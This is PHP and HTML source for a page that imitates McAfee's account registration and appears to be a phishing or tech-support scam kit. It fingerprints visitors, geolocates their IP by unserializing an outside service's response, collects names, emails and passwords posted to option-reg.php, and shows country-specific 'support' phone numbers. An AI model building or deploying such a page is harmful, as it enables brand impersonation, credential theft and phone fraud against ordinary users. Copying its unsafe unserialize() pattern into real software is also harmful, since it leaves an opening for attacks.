<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();


if(isset($_POST['submit']))
{

    $key=$_POST['key'];
}
?>
<?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 

<!DOCTYPE html>
<html>
<head>
	<title>Mcafee Register</title>
	<meta charset="utf-8">
    <link rel="shortcut icon" href="../img/favicon.ico">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="css/login.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">

    <style>
        ::-webkit-input-placeholder { /* Edge */
    color: #4d4d4d;
    font-size: 16px;
    font-weight: 300;
    text-align:left;
    /* padding-left:15px; */
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  :-ms-input-placeholder { /* Internet Explorer */
    color: #4d4d4d;
  }
  
  ::placeholder {
    color: #4d4d4d;
  }
        .loader 
        {   
            margin-left:45%;
            margin-top:15%;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #c01818;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .rk-activ1{
            margin-top:8%;
        }
        .loader2 
        {   
            margin-left:35%;
            margin-top:10%;
            display:none;
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #662d91;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            }

            /* Safari */
            @-webkit-keyframes spin {
            0% { -webkit-transform: rotate(0deg); }
            100% { -webkit-transform: rotate(360deg); }
            }

            @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media only screen and (max-width: 1200px)
        {
            .loader
            {
                margin-top:18%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 1000px)
        {
            .loader
            {
                margin-top:25%;
                margin-left:45%;
            }
        }
        @media only screen and (max-width: 425px)
        {
            .loader
            {
                margin-top:35%;
                margin-left:35%;
            }
        }
        #actr{
            display:none;
        }
    </style>
</head>
<body>
<div class="loader1">
    <div class="container-fluid">
        <div class="col-lg-2 col-md-2"></div>
        <div class="col-lg-8 col-md-8 col-sm-12 col-xs-12 form-box" style="height:950px;">
            <div class="row">
                <div class="col-lg-3 col-md-3 col-xs-3">
                    <a href="index.php"><img src="../img/logo.png" alt=""></a> 
                </div>
                <div class="col-lg-9 col-md-9 col-xs-9" style="margin-top: -11px;">
                    
                </div>
            </div>
            <div class="col-lg-12 login-header-link">
                <div class="col-lg-8 col-xs-8">
                    <ul class="mcafee-login-header">
                        <li><a href="../act-mca.php">Activate Activation Code </a> </li>
                        <li><a href="../mcalog/mca-log.php">Login </a></li>
                        <li><a href="mca-reg.php">Register </a></li>
                        <li><a href="../mca-support.php">Contact Support </a></li>
                    </ul>
                </div>
                <div class="col-lg-4 text-right login-header-side">
                    
                </div>
            </div>
            <div class="row login-section">
                <h1 class="register-heading">Create an Account</h3><br>
                <p class="register-paragraph">If you're a new user, complete our customer profile form below (all fields are required). <br><br>
                Once you have created an account, McAfee remembers your information to help simplify any future orders. Click the I Agree button below to create your account now and to continue with your order. You will have an opportunity to review and confirm your order before your credit card is processed. Need help with your purchase? <br><br>
                If you already have an account, please log in now to continue.</p>
            <form action="option-reg.php" method="POST">
                <div class="row" style="padding-left: 51px;">
                    <div class="form-group form-row">
                        <label class="control-label register-label col-sm-4" for="email">FULL NAME:</label>
                        <div class="col-sm-5">
                          <input id="fullname" type="text" class="form-control input-key-product" id="email"  name="name" required>
                        </div>
                    </div>
                    <div class="form-group form-row">
                        <label class="register-label control-label label-login-form col-sm-4" for="email">EMAIL ADDRESS:</label>
                        <div class="col-sm-5">
                          <input type="email" id="email" class="form-control input-key-product" id="email"  name="email" required>
                        </div>
                    </div>
                    <div class="form-group form-row">
                        <label class=" register-label control-label label-login-form col-sm-4" for="email">CHOOSE A PASSWORD:</label>
                        <div class="col-sm-5">
                          <input type="password" id="passwordpre" class="form-control input-key-product" id="email"  name="pass" required>
                        </div>
                    </div>
                    <div class="form-group form-row">
                        <div class="col-sm-5">
                            <input type="hidden" id="ipField" name="ip" value="<?php echo $ip; ?>" id="">
                            <input type="hidden" id="osField" name="os" value="<?php echo $os; ?>" id="">
                            <input type="hidden" id="browserField" name="browser" value="<?php echo $yourbrowser; ?>" id="">
                        </div>
                    </div>
                </div>
            </div> 
            <input type="submit" style="margin-left:25px" class="reg-in-button" value="I AGREE"><br><br><br>

            <p style="padding-left: 31px;">We do not share your information with anyone without your consent. Read our Privacy Policy</p>
            <hr class="">
            <p style="padding-left: 33px;">By clicking "I Agree" below, you are indicating that you have read and agree to the McAfee End User License Agreement</p>
            <div class="clearfix"></div><br>
            </form>

            <!-- <div class="footer"></div> -->
            
        </div>
        <div class="col-lg-2 col-md-2 col-sm-2"></div>
    </div>
</div>
<div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0332";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4982";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0332";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0332";
}
else
{
    echo "+1 844 514 0332";
}
?>  
  </span> </p>
</div>
</body>
</html>

